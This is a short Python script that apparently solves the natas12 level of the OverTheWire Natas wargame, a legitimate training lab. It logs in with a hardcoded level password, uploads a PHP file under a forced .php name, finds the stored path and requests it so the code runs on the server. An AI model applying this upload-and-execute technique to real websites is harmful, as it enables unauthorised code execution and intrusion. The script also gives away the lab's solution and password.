import requests
import re

username = 'natas12'
password = 'YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG'

url = f"http://{username}.natas.labs.overthewire.org/"


session = requests.Session()

response = session.post(url, auth = (username, password), files = {"uploadedfile": open('getflag.php', 'rb')}, data = {"filename": "getflag.php", "MAX_FILE_SIZE" : "1000"}, )

dir = re.search(r'upload\/\w+\.php', response.text)[0]

fulldir = f"http://{username}.natas.labs.overthewire.org/" + dir


response2 = session.get(fulldir, auth = (username, password))

print(response2.text)